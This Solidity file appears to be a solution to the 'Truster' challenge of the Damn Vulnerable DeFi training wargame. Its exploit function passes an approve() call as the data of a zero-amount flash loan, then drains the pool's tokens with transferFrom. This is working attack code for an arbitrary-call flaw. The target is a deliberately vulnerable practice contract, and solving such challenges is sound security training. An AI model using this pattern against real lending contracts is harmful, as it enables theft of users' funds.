// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Receiver {
    using Address for address payable;

    TrusterLenderPool private immutable pool;

    constructor(address poolAddress) {  
        pool = TrusterLenderPool(poolAddress);
    }

    function exploit(address borrower, address tokenAddress) public payable {
        pool.flashLoan(0, borrower, tokenAddress, bytes(abi.encodeWithSignature("approve(address,uint256)", address(this), 1000000 ether)));
        require(IERC20(tokenAddress).transferFrom(address(pool), msg.sender, 1000000 ether), "Transfer of tokens failed");
    }


}